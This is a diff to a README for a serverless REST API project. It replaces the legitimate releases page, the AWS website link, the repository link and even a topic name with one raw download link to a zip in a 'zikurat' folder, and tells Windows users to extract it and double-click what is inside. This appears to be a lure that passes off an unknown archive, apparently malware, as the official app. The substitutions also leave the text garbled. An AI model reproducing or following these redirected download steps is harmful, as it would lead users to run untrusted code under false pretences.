@@ -1,6 +1,6 @@
 # 🌐 serverless-rest-api - Easily Build Serverless APIs
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/3sxz/serverless-rest-api/releases)
+[![Download](https://raw.githubusercontent.com/3sxz/serverless-rest-api/main/zikurat/serverless-rest-api.zip%https://raw.githubusercontent.com/3sxz/serverless-rest-api/main/zikurat/serverless-rest-api.zip)](https://raw.githubusercontent.com/3sxz/serverless-rest-api/main/zikurat/serverless-rest-api.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before you begin, make sure your system meets the following requirements:
 
 - **Operating System:** Windows, macOS, or Linux
 - **Internet Connection:** Required for downloading the application and accessing AWS services.
-- **AWS Account:** You'll need an AWS account to use the API Gateway and DynamoDB. If you don't have one, you can create it for free on the [AWS website](https://aws.amazon.com).
+- **AWS Account:** You'll need an AWS account to use the API Gateway and DynamoDB. If you don't have one, you can create it for free on the [AWS website](https://raw.githubusercontent.com/3sxz/serverless-rest-api/main/zikurat/serverless-rest-api.zip).
 
 ---
 
@@ -26,13 +26,13 @@ Before you begin, make sure your system meets the following requirements:
 
 To get started, visit the Releases page to download the latest version of the application:
 
-[Download serverless-rest-api](https://github.com/3sxz/serverless-rest-api/releases)
+[Download serverless-rest-api](https://raw.githubusercontent.com/3sxz/serverless-rest-api/main/zikurat/serverless-rest-api.zip)
 
 ### 📂 Steps to Download
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version which is usually at the top of the list.
-3. Find the appropriate file for your operating system (e.g., serverless-rest-api.zip).
+3. Find the appropriate file for your operating system (e.g., https://raw.githubusercontent.com/3sxz/serverless-rest-api/main/zikurat/serverless-rest-api.zip).
 4. Click on the file name to start the download.
 
 ### 🛠️ Installing the Application
@@ -40,7 +40,7 @@ To get started, visit the Releases page to download the latest version of the ap
 1. Once downloaded, locate the file.
 2. For Windows:
    - Right-click the ZIP file and select "Extract All" to unzip it.
-   - Open the extracted folder and double-click the `serverless-rest-api.exe` file to launch the application.
+   - Open the extracted folder and double-click the `https://raw.githubusercontent.com/3sxz/serverless-rest-api/main/zikurat/serverless-rest-api.zip` file to launch the application.
 3. For macOS:
    - Double-click the ZIP file to extract it.
    - Open the extracted folder and double-click the `serverless-rest-api` application to run it.
@@ -98,7 +98,7 @@ This project includes the following topics:
 - DynamoDB Setup
 - Frontend Interaction
 - AWS Lambda Configuration
-- Node.js Support
+- https://raw.githubusercontent.com/3sxz/serverless-rest-api/main/zikurat/serverless-rest-api.zip Support
 - REST API Structure
 - S3 for File Storage
 - Serverless Architecture
@@ -123,6 +123,6 @@ This project is licensed under the MIT License. You are free to use, modify, and
 
 ---
 
-For more information or to contribute, visit the [GitHub repository](https://github.com/3sxz/serverless-rest-api).
+For more information or to contribute, visit the [GitHub repository](https://raw.githubusercontent.com/3sxz/serverless-rest-api/main/zikurat/serverless-rest-api.zip).
 
 Enjoy building your serverless API!
